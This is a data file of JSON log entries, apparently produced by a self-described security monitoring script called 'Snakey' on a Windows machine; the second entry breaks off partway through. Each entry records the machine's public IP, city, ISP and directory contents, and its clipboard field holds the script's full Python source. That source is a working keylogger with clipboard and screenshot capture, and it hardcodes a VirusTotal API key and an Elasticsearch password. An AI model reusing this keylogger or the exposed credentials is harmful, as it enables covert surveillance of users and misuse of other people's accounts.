{"timestamp": "2025-06-10T16:48:24.152405", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException\r\nimport ssl\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon_errors.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\ndef log_daemon_message(level, message):\r\n    timestamp = datetime.now().isoformat()\r\n    log_entry = f\"[{timestamp}] [{level}] {message}\\n\"\r\n    try:\r\n        with open(daemon_log_file, \"a\") as f:\r\n            f.write(log_entry)\r\n        print(log_entry.strip())\r\n    except Exception as e:\r\n        print(f\"[CRITICAL ERROR] Failed to write to daemon log file: {e}\")\r\n        print(log_entry.strip())\r\n\r\nif not os.path.exists(key_path):\r\n    log_daemon_message(\"ERROR\", \"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Failed to load encryption key: {e}. Exiting.\")\r\n    exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = 'localhost'\r\nELASTIC_PORT = 9200\r\nELASTIC_USER = 'elastic'\r\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI'\r\n\r\n# NO LONGER NEEDED: es_context = ssl._create_unverified_context()\r\n\r\nes_client = None\r\n\r\nes_precheck_successful = False\r\nlog_daemon_message(\"INFO\", \"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\ntry:\r\n    response = requests.get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD), verify=False, timeout=10, stream=True)\r\n    log_daemon_message(\"DEBUG\", f\"Basic requests.get status: {response.status_code}\")\r\n    response.raw.read(1)\r\n    response.close()\r\n    if response.status_code == 200:\r\n        log_daemon_message(\"INFO\", \"Basic requests.get pre-check successful (status 200).\")\r\n        es_precheck_successful = True\r\n    else:\r\n        log_daemon_message(\"WARNING\", f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\")\r\n\r\nexcept requests.exceptions.ConnectionError as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\")\r\nexcept requests.exceptions.Timeout:\r\n    log_daemon_message(\"ERROR\", \"requests.Timeout during pre-check: Connection timed out.\")\r\nexcept requests.exceptions.RequestException as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Unexpected error during basic requests pre-check: {e}\")\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            # --- IMPORTANT ADDITIONS ---\r\n            verify_certs=False, # Explicitly tell elasticsearch-py NOT to verify certificates\r\n            ssl_show_warn=False, # Suppress SSL warnings from elasticsearch-py\r\n            # ---------------------------\r\n            request_timeout=30\r\n        )\r\n        log_daemon_message(\"INFO\", \"Elasticsearch client initialized based on successful pre-check.\")\r\n    except ConnectionError as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\")\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n        es_client = None\r\n    except TransportError as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\")\r\n        es_client = None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Erro inesperado ao inicializar cliente Elasticsearch: {e}\")\r\n        es_client = None\r\nelse:\r\n    log_daemon_message(\"WARNING\", \"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions (No changes needed from previous review) ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n             log_daemon_message(\"WARNING\", f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        log_daemon_message(\"INFO\", \"Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Wazuh log file write failed: {e}\")\r\n\r\ndef send_to_elasticsearch(data):\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            log_daemon_message(\"DEBUG\", f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\")\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            log_daemon_message(\"SUCCESS\", f\"Log enviado para Elasticsearch. ID: {response['_id']}\")\r\n        except ConnectionError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\")\r\n        except AuthenticationException as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n        except TransportError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Falha inesperada ao enviar log para Elasticsearch: {e}\")\r\n    else:\r\n        log_daemon_message(\"WARNING\", \"Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\", timeout=5).json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            log_daemon_message(\"WARNING\", \"IP info lookup timed out.\")\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"IP info lookup failed: {e}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Unexpected error during IP info lookup: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"System info collection error: {e}\")\r\n\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n            except TypeError:\r\n                session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Clipboard error: {e}\")\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            screenshot_path = os.path.join(base_path, screenshot_information)\r\n            im = ImageGrab.grab()\r\n            im.save(screenshot_path)\r\n            session_log[\"screenshot_taken\"] = True\r\n            session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Screenshot error: {e}\")\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(os.path.join(base_path, screenshot_information))\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n        else:\r\n            keys.append(f\"[{str(key).replace('Key.', '')}]\")\r\n\r\n    log_daemon_message(\"INFO\", \"Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    listener = None\r\n    try:\r\n        with Listener(on_press=on_press) as listener:\r\n            start_time = time.time()\r\n            while time.time() - start_time < 10:\r\n                time.sleep(1)\r\n                if check_stop_file():\r\n                    log_daemon_message(\"INFO\", \"Stop file detected. Exiting keylogger.\")\r\n                    break\r\n            listener.stop()\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Keylogger listener error: {e}. This might happen if not running in a desktop session.\")\r\n        if listener:\r\n            try:\r\n                listener.stop()\r\n            except Exception as stop_e:\r\n                log_daemon_message(\"WARNING\", f\"Error stopping keylogger listener: {stop_e}\")\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    log_string_for_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n    session_log[\"log_hash\"] = hash_text(log_string_for_hash)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            try:\r\n                with open(json_log_path, \"r\") as f:\r\n                    logs = json.load(f)\r\n            except json.JSONDecodeError:\r\n                log_daemon_message(\"WARNING\", \"Existing JSON log file is corrupt. Starting with empty log.\")\r\n                logs = []\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        log_daemon_message(\"SUCCESS\", \"Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            try:\r\n                with open(hash_ledger_path, \"r\") as f:\r\n                    ledger = json.load(f)\r\n                if ledger and isinstance(ledger[0], str):\r\n                    log_daemon_message(\"INFO\", \"Converting legacy hash ledger format.\")\r\n                    ledger = [{\r\n                        \"timestamp\": \"unknown\",\r\n                        \"log_hash\": h,\r\n                        \"previous_hash\": \"0\" * 64,\r\n                        \"chained_hash\": \"0\" * 64\r\n                    } for h in ledger]\r\n            except json.JSONDecodeError:\r\n                log_daemon_message(\"WARNING\", \"Existing hash ledger file is corrupt. Starting with empty ledger.\")\r\n                ledger = []\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash_input = session_log[\"log_hash\"] + previous_hash\r\n        chained_hash = hash_text(chained_hash_input)\r\n\r\n        ledger_entry = {\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        }\r\n\r\n        ledger.append(ledger_entry)\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        log_daemon_message(\"SUCCESS\", \"Blockchain-style hash ledger updated.\")\r\n\r\n        hash_list = [entry[\"log_hash\"] for entry in ledger]\r\n        merkle_root = build_merkle_tree(hash_list)\r\n\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        log_daemon_message(\"SUCCESS\", \"Merkle root saved.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    log_daemon_message(\"INFO\", \"Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            log_daemon_message(\"INFO\", \"Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        send_to_elasticsearch(session_log)\r\n\r\n        log_daemon_message(\"INFO\", f\"Sleeping for 15 seconds before next collection at {datetime.now().isoformat()}...\")\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        log_daemon_message(\"INFO\", \"Stop file removed.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "4f6a09bdb50feac1b8390b7f31ee7b564bc8ee67a1b7f2a03aac6fb0a770193a", "screenshot_hash": "c6bf8046824c1e9c8f78fd809d81d0c3594023d77524dc9c183b9d09565d7c5c", "log_hash": "e1e1f7ffb0bf360d28f7a2b40bcafec1fee0aed52662065fb89833e2129497de"}
{"timestamp": "2025-06-10T16:48:51.698694", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException\r\nimport ssl\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon_errors.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\ndef log_daemon_message(level, message):\r\n    timestamp = datetime.now().isoformat()\r\n    log_entry = f\"[{timestamp}] [{level}] {message}\\n\"\r\n    try:\r\n        with open(daemon_log_file, \"a\") as f:\r\n            f.write(log_entry)\r\n        print(log_entry.strip())\r\n    except Exception as e:\r\n        print(f\"[CRITICAL ERROR] Failed to write to daemon log file: {e}\")\r\n        print(log_entry.strip())\r\n\r\nif not os.path.exists(key_path):\r\n    log_daemon_message(\"ERROR\", \"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Failed to load encryption key: {e}. Exiting.\")\r\n    exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = 'localhost'\r\nELASTIC_PORT = 9200\r\nELASTIC_USER = 'elastic'\r\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI'\r\n\r\n# NO LONGER NEEDED: es_context = ssl._create_unverified_context()\r\n\r\nes_client = None\r\n\r\nes_precheck_successful = False\r\nlog_daemon_message(\"INFO\", \"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\ntry:\r\n    response = requests.get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD), verify=False, timeout=10, stream=True)\r\n    log_daemon_message(\"DEBUG\", f\"Basic requests.get status: {response.status_code}\")\r\n    response.raw.read(1)\r\n    response.close()\r\n    if response.status_code == 200:\r\n        log_daemon_message(\"INFO\", \"Basic requests.get pre-check successful (status 200).\")\r\n        es_precheck_successful = True\r\n    else:\r\n        log_daemon_message(\"WARNING\", f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\")\r\n\r\nexcept requests.exceptions.ConnectionError as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\")\r\nexcept requests.exceptions.Timeout:\r\n    log_daemon_message(\"ERROR\", \"requests.Timeout during pre-check: Connection timed out.\")\r\nexcept requests.exceptions.RequestException as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Unexpected error during basic requests pre-check: {e}\")\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            # --- IMPORTANT ADDITIONS ---\r\n            verify_certs=False, # Explicitly tell elasticsearch-py NOT to verify certificates\r\n            ssl_show_warn=False, # Suppress SSL warnings from elasticsearch-py\r\n            # ---------------------------\r\n            request_timeout=30\r\n        )\r\n        log_daemon_message(\"INFO\", \"Elasticsearch client initialized based on successful pre-check.\")\r\n    except ConnectionError as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\")\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n        es_client = None\r\n    except TransportError as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\")\r\n        es_client = None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Erro inesperado ao inicializar cliente Elasticsearch: {e}\")\r\n        es_client = None\r\nelse:\r\n    log_daemon_message(\"WARNING\", \"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions (No changes needed from previous review) ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n             log_daemon_message(\"WARNING\", f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        log_daemon_message(\"INFO\", \"Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Wazuh log file write failed: {e}\")\r\n\r\ndef send_to_elasticsearch(data):\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            log_daemon_message(\"DEBUG\", f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\")\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            log_daemon_message(\"SUCCESS\", f\"Log enviado para Elasticsearch. ID: {response['_id']}\")\r\n        except ConnectionError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Connection 